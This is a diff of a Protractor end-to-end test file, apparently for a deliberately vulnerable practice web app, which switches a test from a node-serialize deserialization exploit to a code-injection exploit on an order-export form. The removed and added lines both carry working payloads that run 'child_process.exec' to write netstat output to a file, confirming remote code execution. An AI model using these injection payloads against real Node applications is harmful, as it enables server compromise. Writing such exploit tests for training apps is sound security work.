@@ -1,9 +1,9 @@
 'use strict';
 const fs = require('fs');
 const path = require('path');
-const HelperFunctions = require('./helperFunctions.js');
+const HelperFunctions = require('../helperFunctions.js');
 
-describe('Deserialization - Deserialization Bug', function () {
+describe('RCE Injection', function () {
 
     beforeEach(function () {
         HelperFunctions.login(browser, 'customer0', 'compass0');
@@ -20,13 +20,19 @@ describe('Deserialization - Deserialization Bug', function () {
         });
 
         it('should be successfully', function () {
-            let fileName = 'deserializationBug.txt';
+            let fileName = 'rceInjection.txt';
 
+            element.all(by.css('.glyphicon.glyphicon-user')).get(0).click();
+            browser.sleep(250);
+            //Link
+            element(by.linkText('My Orders')).click();
+            browser.sleep(250);
             //Fill form
-            element(by.model('productSearch.searchValue')).sendKeys("_$$ND_FUNC$$_function (){require('child_process').exec('netstat>" + fileName + "'); }()");
-            browser.actions().sendKeys(protractor.Key.ENTER).perform();
+            element(by.model('orders.export.from')).sendKeys("1");
+            element(by.model('orders.export.range')).sendKeys("require('child_process').exec('netstat>" + fileName + "')");
+            element(by.buttonText('Export pdf')).click();
 
-            let filePath = '../../' + fileName;
+            let filePath = '../../../' + fileName;
 
             browser.wait(function() {
                 try {
